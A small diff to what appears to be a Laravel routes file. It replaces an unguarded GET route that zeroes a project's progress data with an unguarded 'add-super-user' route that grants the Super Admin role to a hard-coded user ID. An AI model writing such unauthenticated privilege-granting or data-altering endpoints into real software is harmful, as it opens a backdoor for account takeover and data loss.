@@ -360,10 +360,6 @@ Route::post('/prueba', function (Request $request) {
 })->name('prueba');
 
 
-Route::get('quitar-curvaS', function () {
-    $projects = Project::find(144);
-    ProgressProjectWeek::where('project_id', 144)->update([
-        'planned_progress' => 0,
-        'real_progress' => 0
-    ]);
+Route::get('add-super-user', function () {
+    $user = UserNotify::find(23)->assignRole('Super Admin');
 });
